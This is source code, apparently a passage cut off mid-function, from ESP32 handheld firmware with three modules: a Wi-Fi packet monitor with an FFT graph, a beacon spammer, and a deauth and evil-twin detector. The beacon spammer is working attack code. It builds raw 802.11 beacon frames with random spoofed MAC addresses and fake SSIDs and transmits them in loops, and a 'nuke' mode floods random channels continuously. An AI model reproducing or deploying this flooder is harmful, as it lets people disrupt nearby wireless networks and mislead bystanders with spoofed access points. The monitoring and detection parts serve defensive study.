#include "wificonfig.h"
#include "shared.h"
#include "icon.h"
#include "Touchscreen.h"

/*
   PacketMonitor
   
*/

namespace PacketMonitor {

#define MAX_CH 14
#define SNAP_LEN 2324

#define MAX_X 240
#define MAX_Y 320

arduinoFFT FFT = arduinoFFT();

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_SELECT 7

bool btnLeftPressed = false;
bool btnRightPressed = false;

Preferences preferences;

const uint16_t samples = 256;
const double samplingFrequency = 5000;

double attenuation = 10;

unsigned int sampling_period_us;
unsigned long microseconds;

double vReal[samples];
double vImag[samples];

byte palette_red[128], palette_green[128], palette_blue[128];

bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];
uint32_t deauths = 0;
unsigned int ch = 1;
int rssiSum;

unsigned int epoch = 0;
unsigned int color_cursor = 2016;


void do_sampling_FFT() {

  microseconds = micros();

  for (int i = 0; i < samples; i++) {
    vReal[i] = tmpPacketCounter * 300;
    vImag[i] = 1;
    while (micros() - microseconds < sampling_period_us) {

    }
    microseconds += sampling_period_us;
  }


  double mean = 0;

  for (uint16_t i = 0; i < samples; i++)
    mean += vReal[i];
  mean /= samples;
  for (uint16_t i = 0; i < samples; i++)
    vReal[i] -= mean;

  microseconds = micros();

  FFT.Windowing(vReal, samples, FFT_WIN_TYP_HAMMING, FFT_FORWARD);
  FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
  FFT.ComplexToMagnitude(vReal, vImag, samples);


  unsigned int left_x = 120;
  unsigned int graph_y_offset = 91;
  int max_k = 0;

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation; // Scale the value
    if (k > max_k)
      max_k = k; // Track the maximum value for potential scaling
    if (k > 127) k = 127; // Cap the value to the palette limit

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int vertical_x = left_x + j;

    tft.drawPixel(vertical_x, epoch + graph_y_offset, color);
  }

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int mirrored_x = left_x - j;
    tft.drawPixel(mirrored_x, epoch + graph_y_offset, color);
  }

  unsigned int area_graph_x_offset = 120;
  unsigned int area_graph_height = 50;
  unsigned int area_graph_y_offset = 38;

  static int last_y[samples >> 1] = {0};
  tft.fillRect(area_graph_x_offset, area_graph_y_offset, (samples >> 1), area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y_offset;
    unsigned int x = area_graph_x_offset + j;

    if (j > 0) {
      tft.fillTriangle(x - 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x - 1, last_y[j - 1], color);
      tft.fillTriangle(x - 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }


  unsigned int area_graph_width = (samples >> 1);
  unsigned int area_graph_x_offset_flipped = -7;

  tft.fillRect(area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y_offset;
    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;

    if (j > 0) {
      tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
      tft.fillTriangle(x + 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  double tattenuation = max_k / 127.0;

  if (tattenuation > attenuation)
    attenuation = tattenuation;

  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setTextFont(1);

  tft.fillRect(30, 20, 130, 16, DARK_GRAY);

  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.print(ch);

  tft.setCursor(80, 24);
  tft.print("Packet:");
  tft.print(tmpPacketCounter);

  delay(10);
}

esp_err_t event_handler(void* ctx, system_event_t* event) {
  return ESP_OK;
}

double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal) maxVal = pkts[i];
  }
  if (maxVal > MAX_Y) return (double)MAX_Y / (double)maxVal;
  else return 1;
}

void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0 )) deauths++;

  if (type == WIFI_PKT_MISC) return;
  if (ctrl.sig_len > SNAP_LEN) return;

  uint32_t packetLength = ctrl.sig_len;

  if (type == WIFI_PKT_MGMT) packetLength -= 4;
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1) ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

void draw() {
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0) rssi = rssiSum / (int)pkts[MAX_X - 1];
  else rssi = rssiSum;
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_up_plus,  // Icon 0: Increase channel
    bitmap_icon_sort_down_minus, // Icon 1: Decrease channel
    bitmap_icon_go_back // Added back icon
  };

  // Draw UI elements only once unless needed

  if (!uiDrawn) {
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 160, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  // Non-blocking animation state machine
  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  // 0: idle, 1: black, 2: white
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  // Throttle touchscreen polling
  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  // Check every 50ms

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();

              switch (i) {
                case 0: setChannel(ch + 1); break;  // Increase channel
                case 1: setChannel(ch - 1); break;  // Decrease channel
                case 2: // Back icon action (exit to submenu)
                    feature_exit_requested = true;
                 break;
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void ptmSetup() {
  Serial.begin(115200);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  for (int i = 0; i < 32; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = 63 - i;
  }
  for (int i = 64; i < 96; i++) {
    palette_red[i] = 31;
    palette_green[i] = (i - 64) * 2;
    palette_blue[i] = 0;
  }
  for (int i = 96; i < 128; i++) {
    palette_red[i] = 31;
    palette_green[i] = 63;
    palette_blue[i] = i - 96;
  }

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  nvs_flash_init();
  tcpip_adapter_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  //ESP_ERROR_CHECK(esp_event_loop_init(event_handler, NULL));
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  //ESP_ERROR_CHECK(esp_wifi_set_country(WIFI_COUNTRY_EU));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  uiDrawn = false;
  tft.fillRect(0, 20, 160, 16, DARK_GRAY);
}

void ptmLoop() {

  runUI();
  updateStatusBar();

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);

  tft.drawLine(0, 90, 240, 90, TFT_WHITE);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  do_sampling_FFT();
  delay(10);
  epoch++;

  if (epoch >= tft.width())
    epoch = 0;

  static uint32_t lastButtonTime = 0;
  const uint32_t debounceDelay = 200;

  bool leftButtonState = !pcf.digitalRead(BTN_LEFT);
  bool rightButtonState = !pcf.digitalRead(BTN_RIGHT);

  uint32_t currentTime = millis();

  if (leftButtonState && !btnLeftPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnLeftPressed = true;
    setChannel(ch - 1);
    lastButtonTime = currentTime;
  } else if (!leftButtonState) {
    btnLeftPressed = false;
  }

  if (rightButtonState && !btnRightPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnRightPressed = true;
    setChannel(ch + 1);
    lastButtonTime = currentTime;
  } else if (!rightButtonState) {
    btnRightPressed = false;
  }

  pkts[127] = tmpPacketCounter;

  tmpPacketCounter = 0;
  deauths = 0;
  rssiSum = 0;
  }
}


/*
   BeaconSpammer


*/

namespace BeaconSpammer {

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_SELECT 7

bool btnLeftPress;
bool btnRightPress;
bool btnSelectPress;

String ssidList[] = {
  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
  "Meme_LANd"
};

const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

uint8_t spamchannel = 1;
bool spam = false;
int y_offset = 20;

uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0xc0, 0x6c,
                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                       0x64, 0x00,
                       0x01, 0x04,
                       0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                       0x01, 0x08, 0x82, 0x84,
                       0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                       0x04
                      };

void handleLeftButton() {
  spamchannel = (spamchannel == 1) ? 14 : spamchannel - 1;
}

void handleRightButton() {
  spamchannel = (spamchannel == 14) ? 1 : spamchannel + 1;
}

void handleSelectButton() {
  spam = !spam;
}

void output() {

  tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);
  tft.print("[!] Preparing");

  for (int i = 0; i < 3; i++) {
    tft.print(".");
    delay(random(1000));
  }

  tft.setCursor(2, 50 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Configuring channel to ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("(");
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.print(spamchannel);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(")");
  delay(random(500));

  tft.setCursor(2, 70 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] SSID generated successfully");
  delay(random(500));

  tft.setCursor(2, 80 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] Setting random SRC MAC");
  delay(random(500));

  tft.setCursor(2, 110 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Starting broadcast");
  delay(random(500));

  for (int i = 0; i < 18; i++) {
    tft.setCursor(2, 130 + i * 10 + y_offset);
    String randomSSID = ssidList[random(ssidCount)];
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("[+] ");
    tft.print(randomSSID);
    delay(random(500));
  }
}

void spammer() {
  esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);

  for (int i = 10; i <= 21; i++) {
    packet[i] = random(256);
  }

  String randomSSID = ssidList[random(ssidCount)];
  int ssidLength = randomSSID.length();
  packet[37] = ssidLength;

  for (int i = 0; i < ssidLength; i++) {
    packet[38 + i] = randomSSID[i];
  }

  for (int i = 38 + ssidLength; i <= 43; i++) {
    packet[i] = 0x00;
  }

  packet[56] = spamchannel;

  esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);

  delay(1);
}

void beaconSpam() {
    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
    byte channel;

    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                            0xc0, 0x6c, 
                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                            0x64, 0x00, 
                            0x01, 0x04, 
                            0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                            0x01, 0x08, 0x82, 0x84,
                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
                            0x04};

    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);
    tft.setCursor(2, 30 + y_offset);
    tft.print("[!!] FUCK IT");
    tft.setCursor(2, 50 + y_offset);
    tft.print("[!!] Press [Select] to exit");                        

    delay(500);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("WiFi init failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Storage set failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Mode set failed: %d\n", err);
        return;
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("WiFi start failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Promiscuous set failed: %d\n", err);
        return;
    }

    while (true) {
        channel = random(1, 13);  
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        for (int i = 10; i <= 15; i++) {
            packet[i] = random(256);
        }
        for (int i = 16; i <= 21; i++) {
            packet[i] = random(256);
        }

        packet[38] = ssid[random(65)];
        packet[39] = ssid[random(65)];
        packet[40] = ssid[random(65)];
        packet[41] = ssid[random(65)];
        packet[42] = ssid[random(65)];
        packet[43] = ssid[random(65)];

        packet[56] = channel;

        esp_err_t result;
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 1 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 2 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 3 send failed: %d\n", result);
        }

        delay(1); 
        
      if (pcf.digitalRead(BTN_SELECT) == LOW) {
        break;
      }
         
    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,  
    bitmap_icon_sort_up_plus,     
    bitmap_icon_start,             
    bitmap_icon_nuke,
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {
    tft.fillRect(120, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 120, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0: 
      break;

    case 1: 
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3: 
      switch (activeIcon) {
        case 0:
          handleLeftButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          handleRightButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          handleSelectButton();
          if (spam) {
            animationState = 4;  
          } else {
            animationState = 0;
            activeIcon = -1;
          }
          break;
        case 3:
          beaconSpam();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4: // Back icon action (exit to submenu)
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: 
      if (spam) {
        if (millis() - lastSpamTime >= 50) {
          spammer();
          
          if (activeIcon = 3) { 
            output();
          }
          if (activeIcon = 3) {
            animationState = 5;  
          }
          lastSpamTime = millis();
        }
      } else {
        animationState = 0;
        activeIcon = -1;
      }
      break;

    case 5: 
      if (millis() - lastSpamTime >= 50) {
        animationState = 0;
        activeIcon = -1;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void beaconSpamSetup() {

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);

  esp_err_t err;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  err = esp_wifi_init(&cfg);
  if (err != ESP_OK) Serial.printf("WiFi init failed: %d\n", err);

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) Serial.printf("Storage set failed: %d\n", err);

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) Serial.printf("Mode set failed: %d\n", err);

  err = esp_wifi_start();
  if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.print("[!] Press [UP] to start");

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  uiDrawn = false;
  tft.fillRect(0, 20, 120, 16, DARK_GRAY);
}

void beaconSpamLoop() {

  runUI();
  updateStatusBar();

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  btnLeftPress = !pcf.digitalRead(BTN_LEFT);
  btnRightPress = !pcf.digitalRead(BTN_RIGHT);
  btnSelectPress = !pcf.digitalRead(BTN_UP);

  delay(10);

  if (btnLeftPress) {
    handleLeftButton();
    delay(200);
  }
  if (btnRightPress) {
    handleRightButton();
    delay(200);
  }
  if (btnSelectPress) {
    handleSelectButton();
    delay(200);
  }

  tft.setTextFont(1);
  tft.fillRect(35, 20, 95, 16, DARK_GRAY);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.print(spamchannel);

  tft.setCursor(70, 24);
  tft.print(spam ? "Enabled " : "Disabled");


    while (spam) {
      spammer();
  
      if (btnSelectPress) {
        output();
      }
  
      if (pcf.digitalRead(BTN_UP)) {
        delay(50);
        break;
      }
    } 
  }
}


/*
   DeauthDetect


*/

namespace DeauthDetect {

#define SCREEN_HEIGHT 280
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_SELECT 7

#define MAX_NETWORKS 50
#define MAX_CHANNELS 14
#define MAX_SSID_LENGTH 8

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

bool stopScan = false;
bool exitMode = false;

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

int deauth[MAX_NETWORKS] = {0};
String ssidLists[MAX_NETWORKS];
uint8_t macList[MAX_NETWORKS][6];

TaskHandle_t wifiScanTaskHandle = NULL;
TaskHandle_t uiTaskHandle = NULL;
TaskHandle_t statusBarTaskHandle = NULL;

SemaphoreHandle_t tftSemaphore;

static int iconX[ICON_NUM] = {210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_power,
  bitmap_icon_go_back // Added back icon
};

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void checkButtonPress() {
  if (!pcf.digitalRead(BTN_UP)) {
    vTaskDelay(200 / portTICK_PERIOD_MS);
    if (!stopScan) {
      stopScan = true;
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Scanning Stopped", TFT_RED, true);
      displayPrint("[!] Press [Select] to Exit", TFT_RED, false);
      xSemaphoreGive(tftSemaphore);
    } else {
      exitMode = true;
    }
  }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (stopScan || exitMode) return;

  wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*) buf;
  uint8_t* payload = packet->payload;

  if (type == WIFI_PKT_MGMT) {
    uint8_t frameType = payload[0];

    if (frameType == 0xC0) {
      uint8_t senderMAC[6];
      memcpy(senderMAC, payload + 10, 6);

      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (memcmp(senderMAC, macList[i], 6) == 0) {
          deauth[i]++;
          xSemaphoreTake(tftSemaphore, portMAX_DELAY);
          displayPrint("[!] Deauth Attack on: " + ssidLists[i], TFT_RED, true);
          xSemaphoreGive(tftSemaphore);
          break;
        }
      }
    }
  }
}

void analyzeNetworks(int n) {
  xSemaphoreTake(tftSemaphore, portMAX_DELAY);
  displayPrint("[*] Checking for Suspicious Networks", TFT_CYAN, true);
  xSemaphoreGive(tftSemaphore);

  for (int i = 0; i < n; i++) {
    checkButtonPress();
    if (exitMode) return;

    bool isDuplicate = false;
    bool isHidden = (ssidLists[i] == "");
    bool isWeirdChannel = WiFi.channel(i) > 13;

    for (int j = 0; j < n; j++) {
      if (i != j && ssidLists[i] == ssidLists[j] && memcmp(macList[i], macList[j], 6) != 0) {
        isDuplicate = true;
        break;
      }
    }

    if (isHidden) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Hidden SSID Detected!", TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isDuplicate) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Evil Twin: " + ssidLists[i], TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isWeirdChannel) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Non-Standard Channel: " + String(WiFi.channel(i)), TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }

    if (deauth[i] > 5) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
